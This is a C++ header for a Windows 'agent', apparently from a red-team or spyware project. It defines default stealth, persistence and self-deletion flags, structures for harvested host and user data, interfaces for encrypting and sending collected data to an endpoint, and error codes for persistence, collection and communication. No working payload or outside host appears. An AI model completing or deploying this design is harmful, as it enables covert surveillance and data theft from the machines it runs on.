#ifndef RT_SRT_COMMON_H
#define RT_SRT_COMMON_H

#include <windows.h>
#include <string>
#include <vector>
#include <memory>

// Version information
#define AGENT_VERSION "1.0.0"
#define AGENT_BUILD_DATE __DATE__

// Configuration defaults
namespace Config {
    // Network settings
    constexpr int DEFAULT_CHECK_INTERVAL = 300;  // 5 minutes
    constexpr int MAX_RETRY_ATTEMPTS = 3;
    constexpr int RETRY_DELAY = 30;  // seconds
    
    // Size limits
    constexpr size_t MAX_LOG_SIZE = 10 * 1024 * 1024;  // 10MB
    constexpr size_t MAX_SINGLE_ITEM = 1024 * 1024;    // 1MB
    
    // Stealth settings
    constexpr bool DEFAULT_STEALTH_MODE = true;
    constexpr bool DEFAULT_PERSISTENCE = true;
    constexpr bool DEFAULT_AUTO_DELETE = true;
}

// Common data structures
struct SystemInfo {
    std::string hostname;
    std::string username;
    std::string os_version;
    std::string architecture;
    std::string ip_address;
    bool is_admin;
    bool is_64bit;
    DWORD process_id;
    DWORD session_id;
};

struct CollectedData {
    std::string data_type;
    std::string timestamp;
    std::vector<uint8_t> data;
    size_t item_count;
    bool is_encrypted;
};

// Module interfaces
class IModule {
public:
    virtual ~IModule() = default;
    virtual bool Initialize() = 0;
    virtual bool Execute() = 0;
    virtual std::string GetName() const = 0;
    virtual std::string GetVersion() const = 0;
};

// Logger interface
class ILogger {
public:
    enum Level {
        DEBUG = 0,
        INFO = 1,
        WARNING = 2,
        ERROR = 3,
        CRITICAL = 4
    };
    
    virtual ~ILogger() = default;
    virtual void Log(Level level, const std::string& message) = 0;
    virtual void SetLevel(Level level) = 0;
};

// Encryption interface
class IEncryption {
public:
    virtual ~IEncryption() = default;
    virtual std::vector<uint8_t> Encrypt(const std::vector<uint8_t>& data) = 0;
    virtual std::vector<uint8_t> Decrypt(const std::vector<uint8_t>& data) = 0;
    virtual std::string GetAlgorithm() const = 0;
};

// Communication interface
class ICommunication {
public:
    virtual ~ICommunication() = default;
    virtual bool SendData(const std::vector<uint8_t>& data) = 0;
    virtual std::vector<uint8_t> ReceiveData() = 0;
    virtual bool IsConnected() const = 0;
    virtual std::string GetEndpoint() const = 0;
};

// Utility functions
namespace Utils {
    // String conversion
    inline std::wstring StringToWString(const std::string& str) {
        if (str.empty()) return std::wstring();
        int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
        std::wstring result(size, 0);
        MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &result[0], size);
        return result;
    }
    
    inline std::string WStringToString(const std::wstring& wstr) {
        if (wstr.empty()) return std::string();
        int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
        std::string result(size, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], size, NULL, NULL);
        return result;
    }
    
    // System information
    inline bool IsSystem64Bit() {
        SYSTEM_INFO si;
        GetNativeSystemInfo(&si);
        return si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64;
    }
    
    inline bool IsProcess64Bit() {
        return sizeof(void*) == 8;
    }
    
    inline bool IsUserAdmin() {
        BOOL isAdmin = FALSE;
        PSID adminGroup = NULL;
        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
        
        if (AllocateAndInitializeSid(&ntAuthority, 2,
                                   SECURITY_BUILTIN_DOMAIN_RID,
                                   DOMAIN_ALIAS_RID_ADMINS,
                                   0, 0, 0, 0, 0, 0, &adminGroup)) {
            CheckTokenMembership(NULL, adminGroup, &isAdmin);
            FreeSid(adminGroup);
        }
        
        return isAdmin == TRUE;
    }
    
    // Process utilities
    inline DWORD GetCurrentSessionId() {
        DWORD sessionId = 0;
        ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
        return sessionId;
    }
    
    // Random generation
    inline std::string GenerateRandomString(size_t length) {
        const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::string result;
        result.reserve(length);
        
        for (size_t i = 0; i < length; ++i) {
            result += charset[rand() % (sizeof(charset) - 1)];
        }
        
        return result;
    }
    
    // File operations
    inline bool FileExists(const std::wstring& path) {
        DWORD attrib = GetFileAttributesW(path.c_str());
        return (attrib != INVALID_FILE_ATTRIBUTES && 
                !(attrib & FILE_ATTRIBUTE_DIRECTORY));
    }
    
    inline bool DirectoryExists(const std::wstring& path) {
        DWORD attrib = GetFileAttributesW(path.c_str());
        return (attrib != INVALID_FILE_ATTRIBUTES && 
                (attrib & FILE_ATTRIBUTE_DIRECTORY));
    }
    
    // Memory cleanup
    template<typename T>
    struct SecureDeleter {
        void operator()(T* ptr) const {
            if (ptr) {
                SecureZeroMemory(ptr, sizeof(T));
                delete ptr;
            }
        }
    };
    
    template<typename T>
    using SecureUniquePtr = std::unique_ptr<T, SecureDeleter<T>>;
}

// Error codes
enum class ErrorCode {
    SUCCESS = 0,
    INITIALIZATION_FAILED = 1,
    ENVIRONMENT_CHECK_FAILED = 2,
    PERSISTENCE_FAILED = 3,
    COLLECTION_FAILED = 4,
    ENCRYPTION_FAILED = 5,
    COMMUNICATION_FAILED = 6,
    UNKNOWN_ERROR = 99
};

// Macros for debugging
#ifdef _DEBUG
    #define DEBUG_LOG(msg) LogDebug(msg)
    #define ASSERT(cond) if (!(cond)) { LogError("Assertion failed: " #cond); __debugbreak(); }
#else
    #define DEBUG_LOG(msg) ((void)0)
    #define ASSERT(cond) ((void)0)
#endif

#endif // RT_SRT_COMMON_H